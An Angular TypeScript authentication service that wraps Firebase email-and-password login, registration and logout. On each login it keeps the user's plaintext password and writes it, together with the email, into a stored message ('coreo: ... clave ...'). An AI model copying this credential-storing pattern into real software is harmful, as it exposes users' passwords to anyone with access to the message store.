import { Injectable } from '@angular/core';
import { AngularFireAuth } from '@angular/fire/compat/auth';
import { User } from '../classes/user/user';
import { MessageService } from './message.service';
import { Message } from '../interfaces/message';
import firebase from 'firebase/compat/app';
import { Observable } from 'rxjs';
@Injectable({ 
  providedIn: 'root',
})
export class AuthenticationService{

  user: User = new User();
  userLogged: Observable<firebase.User | null>;
  private userCredential: any = null;

  constructor(public ngFireAuth: AngularFireAuth, public msg: MessageService) {
    this.userLogged = this.ngFireAuth.authState;
  }
  
  async loginUser(email: string, password: string) {
    return this.ngFireAuth.signInWithEmailAndPassword(email, password)
    .then( (credenciales) => {
      this.userCredential = credenciales.credential;

      this.user = new User();
      this.user.name = email; 
      this.user.pass = password; 
      this.user.credentials = credenciales;
      this.user.loginDate = new Date();

      const mensaje: Message = {
        data:"coreo:" +  `${this.user.name}` + " clave " + `${this.user.pass}`,
        fechaIngreso: this.user.loginDate,
      }

      this.msg.agregarMensaje(mensaje).
      then( () => {
        console.log("se guardó exitosamente la info");
      }).
      catch ( (err) => {
        console.log("ERROR" + err);
      });
    });
  }

  async register(email: string, password: string) {
    try{
      const resp = await this.ngFireAuth.createUserWithEmailAndPassword(
        email,
        password
      );
      this.userCredential = resp.user;
      return  resp;
    } catch (e){
      throw  e;
    }
}
  
  async logOut() {
    this.ngFireAuth.signOut();
  }
}
